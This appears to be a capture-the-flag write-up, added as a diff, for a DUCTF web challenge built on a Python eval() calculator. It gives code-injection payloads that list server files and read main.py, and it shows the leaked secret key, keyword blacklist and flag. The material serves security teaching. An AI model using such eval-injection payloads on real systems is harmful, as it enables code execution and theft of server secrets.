@@ -1,0 +1,45 @@
+:__CHALLENGE DESCRIPTION__:
+
+Joe is aiming to become the next supreme coder by trying to make his code smaller and smaller. 
+His most recent project is a simple calculator which he reckons is super secure because of the "filters" he has in place. 
+However, he thinks that he knows more than everyone around him. Put Joe in his place and grab the flag.
+
+https://chal.duc.tf:30302/
+
+------------------------------------------------------------------------------------------------------
+
+1. Go to the website.
+  My mega calculator can do any calculations python will let you do. Use * + - / % to do complex problems if you want. 
+  
+  
+2. There is an input field which takes the user input for basic Arithmetic calculation's which can be done by python.
+   
+   -> After playin' around with the user input, few of which were evaluated and returned back results.
+       for e.g  -> dir(), [1+2, 4,5], [a for a in range(0,9)] were evaluated.
+       which implies that "eval()" function is passed with user inputs.
+       
+ 3. eval() function evaluates an expression given to it
+    and is dangerous, as it can be used to run python functions like os.getcwd(), os.listdir() and other modules too.
+    but 'os' module needs to be imported. which can be done with:  
+                       
+                       || eval("__import__('os').listdir()") ||
+                      
+                  ['prestart.sh', 'main.py', '__pycache__', 'templates'] 
+                  
+ 4. Read the contents of 'main.py'
+                    [ f for f in open('main.py').readlines() ]
+                    
+                    ['from flask_wtf import FlaskForm\n', 'from flask import Flask, render_template, request\n', 
+                    'from wtforms import Form, validators, StringField, SubmitField\n', '\n', 'app = Flask(__name__)\n', 
+                    "app.config['SECRET_KEY'] = '7d441f27d441f27567d441f2b6176a'\n", '\n', 'blacklist = ["import", "os",
+                    "sys", ";", "print", "__import__", "SECRET", "KEY", "app", "open", "globals", "proc", "self", "read",
+                    "exec"]\n', 'maybe_not_maybe_this = "HYPA HYPA"\n', 'maybe_this_maybe_not = "DUCTF{3v4L_1s_D4ng3r0u5}"\n',......]
+                    
+   THIS GIVES US A LIST OF LINES OF FILE "main.py" AND THERE WE HAVE THE FLAG:
+   
+   ----------------------------------
+   flag : DUCTF{3v4L_1s_D4ng3r0u5}
+   ----------------------------------
+                       
+    
+   
